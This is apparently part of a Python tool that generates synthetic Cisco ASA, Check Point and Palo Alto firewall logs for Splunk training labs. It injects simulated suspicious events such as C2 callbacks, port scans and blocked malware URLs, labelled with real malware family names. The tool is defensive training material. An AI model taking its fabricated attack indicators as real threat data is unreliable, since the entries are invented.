# ---------------------------------------------------------------------------
# Cisco ASA
# ---------------------------------------------------------------------------

class CiscoASAGenerator(LogGenerator):
    name = "cisco_asa"
    description = "Cisco ASA firewall"

    def _asa_line(self, ts: datetime, severity: int, msg_id: str, msg: str) -> str:
        fw = random.choice(HOSTNAMES_FW)
        ts_str = rfc3164_timestamp(ts)
        return f"<{SYSLOG_FACILITIES['local0'] * 8 + severity}>{ts_str} {fw} %ASA-{severity}-{msg_id}: {msg}"

    def generate_normal(self, ts: datetime) -> str:
        kind = random.choice(["conn_built", "conn_teardown", "nat"])
        src_ip = random.choice(INTERNAL_IPS)
        dst_ip = random.choice(EXTERNAL_IPS)
        src_port = random.randint(49152, 65535)
        dst_port = random.choice(COMMON_PORTS)

        if kind == "conn_built":
            conn_id = random.randint(100000, 9999999)
            return self._asa_line(ts, 6, "302013",
                f"Built inbound TCP connection {conn_id} for inside:{src_ip}/{src_port} "
                f"({src_ip}/{src_port}) to outside:{dst_ip}/{dst_port} ({dst_ip}/{dst_port})")

        if kind == "conn_teardown":
            conn_id = random.randint(100000, 9999999)
            duration = f"0:{random.randint(0,59):02d}:{random.randint(0,59):02d}"
            sent = random_bytes()
            rcvd = random_bytes()
            return self._asa_line(ts, 6, "302014",
                f"Teardown TCP connection {conn_id} for inside:{src_ip}/{src_port} "
                f"to outside:{dst_ip}/{dst_port} duration {duration} bytes {sent + rcvd} "
                f"TCP FINs")

        # NAT
        return self._asa_line(ts, 6, "305011",
            f"Built dynamic TCP translation from inside:{src_ip}/{src_port} "
            f"to outside:{random.choice(EXTERNAL_IPS)}/{random.randint(1024, 65535)}")

    def generate_suspicious(self, ts: datetime) -> str:
        kind = random.choice(["denied_in", "denied_out", "scan", "threat"])
        src_ip = random.choice(SUSPICIOUS_IPS)
        dst_ip = random.choice(INTERNAL_IPS)

        if kind == "denied_in":
            dst_port = random.choice(SUSPICIOUS_PORTS + COMMON_PORTS[:4])
            return self._asa_line(ts, 4, "106023",
                f"Deny tcp src outside:{src_ip}/{random.randint(1024, 65535)} "
                f"dst inside:{dst_ip}/{dst_port} by access-group \"outside_in\" "
                f"[SUSPICIOUS: inbound denied from malicious IP {src_ip}]")

        if kind == "denied_out":
            src_ip = random.choice(INTERNAL_IPS)
            dst_ip = random.choice(SUSPICIOUS_IPS)
            dst_port = random.choice(SUSPICIOUS_PORTS)
            return self._asa_line(ts, 4, "106023",
                f"Deny tcp src inside:{src_ip}/{random.randint(49152, 65535)} "
                f"dst outside:{dst_ip}/{dst_port} by access-group \"inside_out\" "
                f"[SUSPICIOUS: internal host contacting C2 port {dst_port}]")

        if kind == "scan":
            num_ports = random.randint(50, 500)
            return self._asa_line(ts, 2, "106001",
                f"Inbound TCP connection denied from {src_ip}/{random.randint(1024, 65535)} "
                f"to {dst_ip}/{random.choice(SUSPICIOUS_PORTS)} flags SYN "
                f"[SUSPICIOUS: port scan detected — {num_ports} attempts from {src_ip}]")

        # threat detection
        return self._asa_line(ts, 1, "733100",
            f"[Scanning] drop rate-1 exceeded. Current burst rate is {random.randint(50, 500)} "
            f"per second, max configured rate is 10; "
            f"Current average rate is {random.randint(100, 1000)} per second, "
            f"max configured rate is 5; Cumulative total count is {random.randint(5000, 50000)} "
            f"[SUSPICIOUS: threat detection triggered — possible DDoS or scan from {src_ip}]")


# ---------------------------------------------------------------------------
# Check Point
# ---------------------------------------------------------------------------

class CheckPointGenerator(LogGenerator):
    name = "checkpoint"
    description = "Check Point firewall"

    def _cp_line(self, ts: datetime, fields: dict) -> str:
        ts_str = ts.strftime("%d%b%Y %H:%M:%S")
        fw = random.choice(HOSTNAMES_FW)
        parts = [f'{ts_str} {fw}']
        for k, v in fields.items():
            parts.append(f'{k}="{v}"' if isinstance(v, str) and " " in v else f"{k}={v}")
        return " ".join(parts)

    def generate_normal(self, ts: datetime) -> str:
        src = random.choice(INTERNAL_IPS)
        dst = random.choice(EXTERNAL_IPS)
        src_port = random.randint(49152, 65535)
        dst_port = random.choice(COMMON_PORTS)
        proto = random.choice(["tcp", "udp"])
        rule = random.randint(1, 80)
        sent = random_bytes()
        rcvd = random_bytes()

        return self._cp_line(ts, {
            "action": "Accept",
            "conn_direction": "Outgoing",
            "ifdir": "outbound",
            "logid": random.randint(100000, 999999),
            "origin": random.choice(HOSTNAMES_FW),
            "type": "Log",
            "product": "VPN-1 & FireWall-1",
            "rule": rule,
            "rule_name": f"Allow-LAN-{rule}",
            "src": src,
            "dst": dst,
            "proto": proto,
            "s_port": src_port,
            "service": dst_port,
            "bytes": sent + rcvd,
            "elapsed": random.randint(1, 300),
            "user": random.choice(USERS_NORMAL),
        })

    def generate_suspicious(self, ts: datetime) -> str:
        kind = random.choice(["drop", "blade_alert", "policy_violation", "suspicious_geo"])

        if kind == "drop":
            src = random.choice(SUSPICIOUS_IPS)
            dst = random.choice(INTERNAL_IPS)
            return self._cp_line(ts, {
                "action": "Drop",
                "conn_direction": "Incoming",
                "ifdir": "inbound",
                "logid": random.randint(100000, 999999),
                "origin": random.choice(HOSTNAMES_FW),
                "type": "Log",
                "product": "VPN-1 & FireWall-1",
                "rule": 0,
                "rule_name": "Cleanup",
                "src": src,
                "dst": dst,
                "proto": "tcp",
                "s_port": random.randint(1024, 65535),
                "service": random.choice(SUSPICIOUS_PORTS),
                "attack": "SUSPICIOUS: connection from known threat actor IP",
            })

        if kind == "blade_alert":
            src = random.choice(INTERNAL_IPS)
            dst = random.choice(SUSPICIOUS_IPS)
            threat = random.choice(THREAT_NAMES)
            return self._cp_line(ts, {
                "action": "Prevent",
                "conn_direction": "Outgoing",
                "ifdir": "outbound",
                "logid": random.randint(100000, 999999),
                "origin": random.choice(HOSTNAMES_FW),
                "type": "Log",
                "product": "Anti-Bot",
                "rule": 999,
                "rule_name": "Threat Prevention",
                "src": src,
                "dst": dst,
                "proto": "tcp",
                "s_port": random.randint(49152, 65535),
                "service": 443,
                "malware_action": "Communication with C&C",
                "protection_name": threat,
                "severity": "Critical",
                "confidence_level": "High",
                "attack": f"SUSPICIOUS: bot communication — {threat}",
            })

        if kind == "policy_violation":
            src = random.choice(INTERNAL_IPS)
            dst = random.choice(EXTERNAL_IPS)
            return self._cp_line(ts, {
                "action": "Reject",
                "conn_direction": "Outgoing",
                "ifdir": "outbound",
                "logid": random.randint(100000, 999999),
                "origin": random.choice(HOSTNAMES_FW),
                "type": "Log",
                "product": "URL Filtering",
                "rule": random.randint(1, 20),
                "rule_name": "Block-Malicious-URLs",
                "src": src,
                "dst": dst,
                "proto": "tcp",
                "s_port": random.randint(49152, 65535),
                "service": 443,
                "matched_category": random.choice(URL_CATEGORIES_SUSPICIOUS),
                "resource": f"https://{random.choice(DNS_QUERIES_SUSPICIOUS)}/payload",
                "attack": "SUSPICIOUS: access to malicious URL blocked",
            })

        # suspicious_geo
        src = random.choice(SUSPICIOUS_IPS)
        return self._cp_line(ts, {
            "action": "Drop",
            "conn_direction": "Incoming",
            "ifdir": "inbound",
            "logid": random.randint(100000, 999999),
            "origin": random.choice(HOSTNAMES_FW),
            "type": "Log",
            "product": "VPN-1 & FireWall-1",
            "rule": random.randint(1, 10),
            "rule_name": "GeoBlock-HighRisk",
            "src": src,
            "dst": random.choice(INTERNAL_IPS),
            "proto": "tcp",
            "s_port": random.randint(1024, 65535),
            "service": random.choice([22, 3389, 445]),
            "attack": f"SUSPICIOUS: high-risk geo access attempt from {src}",
        })


# ---------------------------------------------------------------------------
# Palo Alto Networks
# ---------------------------------------------------------------------------

class PaloAltoGenerator(LogGenerator):
    name = "paloalto"
    description = "Palo Alto Networks firewall"

    def _pa_csv(self, ts: datetime, fields: list[str]) -> str:
        """Palo Alto uses CSV format for syslog forwarding."""
        return ",".join(fields)

    def generate_normal(self, ts: datetime) -> str:
        ts_str = ts.strftime("%Y/%m/%d %H:%M:%S")
        fw = random.choice(HOSTNAMES_FW)
        serial = f"0150{random.randint(10000000, 99999999)}"
        src = random.choice(INTERNAL_IPS)
        dst = random.choice(EXTERNAL_IPS)
        src_port = str(random.randint(49152, 65535))
        dst_port = random.choice(COMMON_PORTS)
        proto = random.choice(["tcp", "udp"])
        rule = f"Allow-Outbound-{random.randint(1, 20)}"
        app = random.choice(["ssl", "web-browsing", "dns", "ms-update", "google-base", "office365-base"])
        zone_src = "trust"
        zone_dst = "untrust"
        sent = str(random_bytes())
        rcvd = str(random_bytes())
        session_id = str(random.randint(100000, 9999999))
        repeat_count = "1"

        fields = [
            "1", ts_str, serial, "TRAFFIC", "end", "2049",
            ts_str, src, dst, "0.0.0.0", "0.0.0.0",
            rule, random.choice(USERS_NORMAL), "", app,
            "vsys1", zone_src, zone_dst, "ethernet1/2", "ethernet1/1",
            "Log-Forwarding-Default", "", session_id,
            repeat_count, src_port, str(dst_port), "0", "0",
            "0x400000", proto, "allow",
            sent, rcvd, str(random.randint(1, 300)), "aged-out",
            "0", "0", "0", "", "", "",
            "any", "any", "any",
            f"from-policy"
        ]
        return self._pa_csv(ts, fields)

    def generate_suspicious(self, ts: datetime) -> str:
        ts_str = ts.strftime("%Y/%m/%d %H:%M:%S")
        fw = random.choice(HOSTNAMES_FW)
        serial = f"0150{random.randint(10000000, 99999999)}"
        kind = random.choice(["threat", "spyware", "url_block", "deny_c2"])

        if kind == "threat":
            src = random.choice(SUSPICIOUS_IPS)
            dst = random.choice(INTERNAL_IPS)
            threat = random.choice(THREAT_NAMES)
            fields = [
                "1", ts_str, serial, "THREAT", "vulnerability", "2049",
                ts_str, src, dst, "0.0.0.0", "0.0.0.0",
                "Threat-Block", "", "", "web-browsing",
                "vsys1", "untrust", "trust", "ethernet1/1", "ethernet1/2",
                "Log-Forwarding-Default", "", str(random.randint(100000, 9999999)),
                "1", str(random.randint(1024, 65535)), "80", "0", "0",
                "0x400000", "tcp", "reset-both",
                "", "", "0",
                f"{threat}(9999)", "critical", "server",
                "any", "any", "any",
                f"SUSPICIOUS: vulnerability exploit — {threat}"
            ]
            return self._pa_csv(ts, fields)

        if kind == "spyware":
            src = random.choice(INTERNAL_IPS)
            dst = random.choice(SUSPICIOUS_IPS)
            threat = random.choice(["Cobalt Strike Beacon", "Emotet.Gen", "TrickBot C2", "AgentTesla"])
            fields = [
                "1", ts_str, serial, "THREAT", "spyware", "2049",
                ts_str, src, dst, "0.0.0.0", "0.0.0.0",
                "Threat-Block", random.choice(USERS_NORMAL + USERS_SUSPICIOUS), "", "ssl",
                "vsys1", "trust", "untrust", "ethernet1/2", "ethernet1/1",
                "Log-Forwarding-Default", "", str(random.randint(100000, 9999999)),
                "1", str(random.randint(49152, 65535)), "443", "0", "0",
                "0x400000", "tcp", "reset-both",
                "", "", "0",
                f"{threat}(8888)", "critical", "client",
                "any", "any", "any",
                f"SUSPICIOUS: spyware C2 callback — {threat} to {dst}"
            ]
            return self._pa_csv(ts, fields)

        if kind == "url_block":
            src = random.choice(INTERNAL_IPS)
            url = random.choice(DNS_QUERIES_SUSPICIOUS)
            cat = random.choice(URL_CATEGORIES_SUSPICIOUS)
            fields = [
                "1", ts_str, serial, "THREAT", "url", "2049",
                ts_str, src, random.choice(SUSPICIOUS_IPS), "0.0.0.0", "0.0.0.0",
                "URL-Filtering", random.choice(USERS_SUSPICIOUS + USERS_NORMAL[:2]), "", "web-browsing",
                "vsys1", "trust", "untrust", "ethernet1/2", "ethernet1/1",
                "Log-Forwarding-Default", "", str(random.randint(100000, 9999999)),
                "1", str(random.randint(49152, 65535)), "443", "0", "0",
                "0x400000", "tcp", "block-url",
                f"https://{url}/malware.exe", "", "0",
                f"{cat}(9999)", "high", "client",
                cat, "any", "any",
                f"SUSPICIOUS: malicious URL access blocked — {url}"
            ]
            return self._pa_csv(ts, fields)

        # deny_c2
        src = random.choice(INTERNAL_IPS)
        dst = random.choice(SUSPICIOUS_IPS)
        fields = [
            "1", ts_str, serial, "TRAFFIC", "deny", "2049",
            ts_str, src, dst, "0.0.0.0", "0.0.0.0",
            "Deny-C2", random.choice(USERS_SUSPICIOUS), "", "unknown-tcp",
            "vsys1", "trust", "untrust", "ethernet1/2", "ethernet1/1",
            "Log-Forwarding-Default", "", str(random.randint(100000, 9999999)),
            "1", str(random.randint(49152, 65535)), str(random.choice(SUSPICIOUS_PORTS)),
            "0", "0", "0x400000", "tcp", "deny",
            "0", "0", "0", "policy-deny",
            "0", "0", "0", "", "", "",
            "any", "any", "any",
            f"SUSPICIOUS: C2 traffic denied to {dst}:{random.choice(SUSPICIOUS_PORTS)}"
        ]
        return self._pa_csv(ts, fields)


# ---------------------------------------------------------------------------
# Generator registry
# ---------------------------------------------------------------------------

GENERATORS: dict[str, type[LogGenerator]] = {
    "windows": WindowsXMLGenerator,
    "syslog": SyslogGenerator,
    "fortinet": FortinetGenerator,
    "cisco_asa": CiscoASAGenerator,
    "checkpoint": CheckPointGenerator,
    "paloalto": PaloAltoGenerator,
}


# ---------------------------------------------------------------------------
# Output engine
# ---------------------------------------------------------------------------

class OutputEngine:
    """Handles writing logs to stdout or file."""

    def __init__(self, output_path: str | None = None):
        self._file = None
        if output_path:
            os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
            self._file = open(output_path, "a", encoding="utf-8")

    def write(self, line: str) -> None:
        if self._file:
            self._file.write(line + "\n")
            self._file.flush()
        else:
            print(line, flush=True)

    def close(self) -> None:
        if self._file:
            self._file.close()


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

class LogOrchestrator:
    """Coordinates log generation with rate control, bursts, and suspicious injection."""

    def __init__(
        self,
        generator: LogGenerator,
        output: OutputEngine,
        count: int,
        mode: str,
        rate: float,
        burst: bool,
        burst_size: int,
        burst_interval: float,
        suspicious_pct: float,
    ):
        self.generator = generator
        self.output = output
        self.count = count
        self.mode = mode
        self.rate = rate
        self.burst = burst
        self.burst_size = burst_size
        self.burst_interval = burst_interval
        self.suspicious_pct = suspicious_pct / 100.0
        self._running = True

        signal.signal(signal.SIGINT, self._handle_stop)
        signal.signal(signal.SIGTERM, self._handle_stop)

    def _handle_stop(self, *_):
        self._running = False
        sys.stderr.write("\n[!] Stopping generation...\n")

    def _is_suspicious(self) -> bool:
        return random.random() < self.suspicious_pct

    def _emit_one(self) -> None:
        ts = random_timestamp()
        suspicious = self._is_suspicious()
        line = self.generator.generate(ts, suspicious=suspicious)
        self.output.write(line)

    def _emit_batch(self, size: int) -> int:
        """Emit a batch of logs as fast as possible. Returns count emitted."""
        emitted = 0
        for _ in range(size):
            if not self._running:
                break
            self._emit_one()
            emitted += 1
        return emitted

    def run(self) -> None:
        total_emitted = 0

        if self.mode == "single":
            self._emit_batch(self.count)
            total_emitted = self.count
            sys.stderr.write(f"[+] Generated {total_emitted} log(s) ({self.generator.name})\n")
            return

        # Continuous mode
        sys.stderr.write(
            f"[+] Continuous mode: {self.rate} events/sec | "
            f"burst={'ON' if self.burst else 'OFF'} | "
            f"suspicious={self.suspicious_pct * 100:.0f}% | "
            f"Press Ctrl+C to stop\n"
        )

        interval = 1.0 / self.rate if self.rate > 0 else 0.1
        last_burst = time.time()

        while self._running:
            # Normal steady-state emission
            self._emit_one()
            total_emitted += 1

            # Check for burst
            if self.burst:
                now = time.time()
                if now - last_burst >= self.burst_interval:
                    sys.stderr.write(
                        f"[!] BURST: emitting {self.burst_size} events at once "
                        f"(total so far: {total_emitted})\n"
                    )
                    emitted = self._emit_batch(self.burst_size)
                    total_emitted += emitted
                    last_burst = now

            # Rate limiting
            time.sleep(interval)

        sys.stderr.write(f"\n[+] Total events generated: {total_emitted}\n")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="log_generator",
        description="Generate realistic logs for Splunk training and lab environments.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:

  # Generate 500 Windows XML events with 10%% suspicious events
  python log_generator.py -t windows -c 500 -s 10

  # Continuous syslog at 20 events/sec, bursts of 100 every 30s
  python log_generator.py -t syslog -m continuous -r 20 --burst --burst-size 100 --burst-interval 30

  # Fortinet logs to file, single batch of 1000
  python log_generator.py -t fortinet -c 1000 -o /var/log/generated/fortinet.log

  # All firewall types mixed, continuous with high suspicious rate
  python log_generator.py -t fortinet,cisco_asa,checkpoint,paloalto -m continuous -r 5 -s 25

  # Quick test with defaults
  python log_generator.py -t syslog
        """,
    )

    p.add_argument(
        "-t", "--type",
        required=True,
        help=(
            "Log type(s) to generate. Comma-separated for multiple. "
            "Options: " + ", ".join(GENERATORS.keys())
        ),
    )
    p.add_argument(
        "-c", "--count",
        type=int,
        default=100,
        help="Number of events to generate in 'single' mode (default: 100).",
    )
    p.add_argument(
        "-m", "--mode",
        choices=["single", "continuous"],
        default="single",
        help="Generation mode: 'single' batch or 'continuous' stream (default: single).",
    )
    p.add_argument(
        "-r", "--rate",
        type=float,
        default=5.0,
        help="Events per second in continuous mode (default: 5).",
    )
    p.add_argument(
        "--burst",
        action="store_true",
        help="Enable burst mode (periodic spikes of events).",
    )
    p.add_argument(
        "--burst-size",
        type=int,
        default=50,
        help="Number of events per burst (default: 50).",
    )
    p.add_argument(
        "--burst-interval",
        type=float,
        default=30.0,
        help="Seconds between bursts (default: 30).",
    )
    p.add_argument(
        "-s", "--suspicious-rate",
        type=float,
        default=5.0,
        help="Percentage of suspicious/malicious events to inject (default: 5).",
    )
    p.add_argument(
        "-o", "--output",
        type=str,
        default=None,
        help="Output file path. If omitted, logs go to stdout.",
    )

    return p


class MultiGenerator(LogGenerator):
    """Wraps multiple generators and picks one at random per event."""

    name = "multi"
    description = "Multiple log types"

    def __init__(self, generators: list[LogGenerator]):
        self._generators = generators

    def generate_normal(self, ts: datetime) -> str:
        return random.choice(self._generators).generate_normal(ts)

    def generate_suspicious(self, ts: datetime) -> str:
        return random.choice(self._generators).generate_suspicious(ts)


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    # Parse log types
    requested_types = [t.strip() for t in args.type.split(",")]
    generators = []
    for t in requested_types:
        if t not in GENERATORS:
            parser.error(
                f"Unknown log type '{t}'. Available: {', '.join(GENERATORS.keys())}"
            )
        generators.append(GENERATORS[t]())

    if len(generators) == 1:
        generator = generators[0]
    else:
        generator = MultiGenerator(generators)

    output = OutputEngine(args.output)

    try:
        orchestrator = LogOrchestrator(
            generator=generator,
            output=output,
            count=args.count,
            mode=args.mode,
            rate=args.rate,
            burst=args.burst,
            burst_size=args.burst_size,
            burst_interval=args.burst_interval,
            suspicious_pct=args.suspicious_rate,
        )
        orchestrator.run()
    finally:
        output.close()


if __name__ == "__main__":
    main()
